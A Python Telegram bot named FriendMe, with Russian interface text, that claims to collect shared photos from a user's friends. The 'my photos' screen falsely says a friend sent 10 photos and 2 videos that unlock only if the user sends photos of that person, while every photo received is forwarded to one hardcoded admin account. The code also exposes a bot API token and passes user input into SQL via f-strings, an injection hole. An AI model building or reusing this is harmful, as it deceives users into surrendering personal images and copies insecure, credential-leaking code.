import telebot
import random
import sqlite3
import datetime
from telebot import types
print('start bot')

bot = telebot.TeleBot('6199788488:AAFQt9ndMV1AL5lAuxnA0WZ5v3lUtAtgB9A')

connect = sqlite3.connect('friendMe.db', check_same_thread=False)

lower = "abcdfghjklmnpqrstvwxz"
upper = "ABCDFGHJKLMNPQRSTVWXZ"
numbers = "0123456789"
string = lower + upper + numbers
lenght = 16
link = "".join(random.sample(string,lenght))
admin_id = 1900666417


def init_bot():
    
    cursor = connect.cursor()
    cursor.execute("""CREATE TABLE IF NOT EXISTS users(
               id integer PRIMARY KEY AUTOINCREMENT,
               tg_id integer,
               user_name varchar,
               ref_id number,
               date date
           )""")
    connect.commit()

    cursor.execute("""CREATE TABLE IF NOT EXISTS images(
            id integer PRIMARY KEY AUTOINCREMENT,
            id_image integer,
            from_id integer,
            to_id integer,
            date date
    )""")
    connect.commit()


init_bot()


def reg_user(chat_id, username, ref_id=None):

    cursor = connect.cursor()
    cursor.execute(f"SELECT tg_id FROM users WHERE tg_id={chat_id}")
    data = cursor.fetchone()

    if data is None:
        cursor.execute("INSERT INTO users VALUES(?,?,?,?,?);", (None, chat_id, username, ref_id, datetime.datetime.now()))
        connect.commit()
    else:
        cursor.execute(f"UPDATE users SET ref_id='{ref_id}' WHERE tg_id={chat_id}")
        connect.commit()

#Меню Старт
@bot.message_handler(commands=['start'])
def start(message):

    ref_id = None
    
    ref_id_arr = (message.text).split(' ')

    if len(ref_id_arr) > 1:
        ref_id = ref_id_arr[1]
        print("кто пригласил:", ref_id)
            

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True,row_width=2)
    start_button1 = types.KeyboardButton('🖼️ МОИ ФОТО')
    start_button2 = types.KeyboardButton('📨 ОБРАТНАЯ СВЯЗЬ')
    start_button3 = types.KeyboardButton('⛓️ ОТПРАВИТЬ ССЫЛКУ ДРУГУ')
    test_bd =types.InlineKeyboardButton('ТЕСТ MYSQL')
    markup.add(start_button1,start_button2,start_button3,test_bd)

    reg_user(message.from_user.id, message.from_user.username, ref_id)

    bot.send_message(message.chat.id,'<b>Приветствуем тебя дорогой друг!👋</b>\nС помощью нашего бота ты можешь со всех своих друзей собрать совместные фото и видео с тобой и вспомнить забытые и смешные моменты!\n\nКак это работает:\n1️⃣Нажмите кнопку в меню "отправить ссылку другу"\n2️⃣Выберите "Поделиться историей Instagram"\n3️⃣﻿﻿Добавьте себе историю в инстаграм как указано инструкции по кнопке\n4️⃣Все фото которые отправят друзья мы будем отображать в разделе "Мои фото"\n\nКак только кто-то из твоих друзей отправит что-то по ссылке мы обязательно тебе об этом скажем😊',parse_mode='html',reply_markup=markup)

@bot.message_handler(content_types=['text'])
def chat_message(message):

    reg_user(message.from_user.id, message.from_user.username)

    if message.text == '🖼️ МОИ ФОТО':
        markup = types.InlineKeyboardMarkup(row_width=2)
        item_my_photo1 = types.InlineKeyboardButton(text='Отправить в ответ',callback_data='itemmyphoto1')
        item_my_photo2 = types.InlineKeyboardButton(text='Далее',callback_data='itemmyphoto2')
        markup.add(item_my_photo1,item_my_photo2)
        bot.send_message(message.chat.id,f'📸 Пользователь {message.from_user.first_name} отправил вам 10 фотографий и 2 видео:\n\nЧто бы их увидеть отправьте ему в ответ любую фотографию или видео с его участием\n\nОтправте их по его ссылке или нажмите на кнопку"Отправить в ответ"',reply_markup=markup)
    elif message.text == '📨 ОБРАТНАЯ СВЯЗЬ':
        markup_info = types.InlineKeyboardMarkup(row_width=2)
        item_info1 = types.InlineKeyboardButton(text='Instagram',callback_data='instagram_info',url='https://www.instagram.com/')
        item_info2 = types.InlineKeyboardButton(text='Twitter', callback_data='twitter_info',url='https://twitter.com/')
        item_info3 = types.InlineKeyboardButton(text='Facebook', callback_data='facebook_info',url='https://uk-ua.facebook.com/')
        item_info4 = types.InlineKeyboardButton(text='Telegram', callback_data='telegram_info',url='https://telegram.org/')
        markup_info.add(item_info1,item_info2,item_info3,item_info4)
        bot.send_message(message.chat.id,'<b>Обратная связь</b>\n\nВ случае неисправности бота или зафиксированной ошибке , просьба обратится в нашу тех-поддержу по адресу : @friendme_support\n\nТак же если у вас сеть предложения для улучшения нашего сервиса ,можете обратиться по адресу : @friendme_offers\n\n<b>FriendMe в социальных сетях:</b>',parse_mode='html',reply_markup=markup_info)
    elif message.text == '⛓️ ОТПРАВИТЬ ССЫЛКУ ДРУГУ':
        markup = types.InlineKeyboardMarkup(row_width=1)
        item1 = types.InlineKeyboardButton(text='Поделиться в Instagram Stories',callback_data='share1')
        item2 = types.InlineKeyboardButton(text='Поделиться в Telegram',callback_data='share2')
        item3 = types.InlineKeyboardButton(text='Показать ссылку в чате',callback_data='share3')
        markup.add(item1,item2,item3)
        bot.send_message(message.chat.id,'<b>⤴️Поделиться с друзьями удобным для вас способом:</b>',parse_mode='html',reply_markup=markup)
    elif message.text == 'ТЕСТ MYSQL':
       pass

@bot.message_handler(content_types=['photo'])
def photo(message):
    reg_user(message.from_user.id, message.from_user.username)

    # Получаем id фотографии
    image_id = message.photo[-1].file_id
    date_image = datetime.datetime.now()
    from_id = message.from_user.id

    cursor = connect.cursor()
    cursor.execute("INSERT INTO images VALUES(?,?,?,?,?);", (None, image_id, from_id, admin_id, date_image))
    connect.commit()

    cursor.execute(f"SELECT * FROM images WHERE id={cursor.lastrowid}")
    data = cursor.fetchall()

    get_receiver_id = data[0][3]
    get_image_id = data[0][1]

    bot.send_photo(get_receiver_id, get_image_id)

@bot.callback_query_handler(func=lambda callback:callback.data)
def callback_my_photo(callback):
    reg_user(callback.from_user.id, callback.from_user.username)

    if callback.data == 'itemmyphoto1':
        bot.send_message(callback.message.chat.id,'b1')
    elif callback.data == 'itemmyphoto2':
        bot.send_message(callback.message.chat.id, 'b2')
    elif callback.data == 'share1':
        bot.send_message(callback.message.chat.id, '1')
    elif callback.data == 'share2':
        bot.send_message(callback.message.chat.id, '2')
    elif callback.data == 'share3':
        bot.send_message(callback.message.chat.id,f'https://t.me/Friend_Me_bot?start={callback.message.from_user.id}')



bot.polling(none_stop=True)